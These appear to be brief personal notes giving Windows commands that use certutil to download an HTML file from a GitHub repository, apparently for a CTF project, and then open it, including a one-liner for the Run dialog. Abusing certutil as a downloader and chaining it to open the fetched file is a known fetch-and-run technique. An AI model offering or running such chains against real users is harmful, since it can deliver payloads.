Downloading GitHub file -
certutil -urlcache -split -f "https://raw.githubusercontent.com/InoshMatheesha/SecureShopCTF/refs/heads/main/docs/index.html" "%USERPROFILE%\Downloads\test.html"

Open that file -
start "" "%USERPROFILE%\Downloads\test.html"

In Run -
cmd /c "certutil -urlcache -split -f https://raw.githubusercontent.com/InoshMatheesha/SecureShopCTF/refs/heads/main/docs/index.html %USERPROFILE%\Downloads\test.html && start %USERPROFILE%\Downloads\test.html"
